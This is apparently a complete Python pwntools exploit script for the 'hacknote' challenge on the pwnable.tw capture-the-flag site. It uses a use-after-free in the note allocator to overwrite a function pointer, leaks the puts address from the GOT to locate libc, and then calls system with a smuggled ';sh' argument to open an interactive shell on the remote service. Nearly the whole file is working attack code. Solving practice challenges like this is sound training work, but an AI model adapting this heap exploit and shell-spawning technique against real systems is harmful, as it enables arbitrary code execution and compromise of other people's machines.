from pwn import *
from LibcSearcher import *
context(arch = "i386", os = "Linux", log_level = "Debug")
elf = ELF("./hacknote")
io = process("./hacknote")
io = remote("chall.pwnable.tw", 10102)
# gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def add(size, content):
    ru("Your choice :")
    sl("1")
    ru("Note size :")
    sl(str(size))
    ru("Content :")
    sl(content)

def delete(idx):
    ru("Your choice :")
    sl("2")
    ru("Index :")
    sl(str(idx))

def show(idx):
    ru("Your choice :")
    sl("3")
    ru("Index :")
    sl(str(idx))

#* symbols(no pie)
puts_func = 0x0804862B

#! 0
add(24, "A" * 8)
#! 
add(24, "B" * 8)
delete(0)
delete(1)
#! 2
#* alloc two info chunk with size 0x10 
add(8, p32(puts_func) + p32(elf.got["puts"]))
show(0)

puts_addr = u32(rl()[:4].ljust(4, "\0"))
log.info("puts address in libc is : " + hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_addr = puts_addr - libc.dump('puts')
log.info("libc address is : " + hex(libc_addr))

system_addr = libc_addr + libc.dump('system')
bin_sh_addr = libc_addr + libc.dump('str_bin_sh')
log.info("/bin/sh address : " + hex(bin_sh_addr))
delete(2)

#! 3
add(8, p32(system_addr) + ";sh")
show(0)
itr()
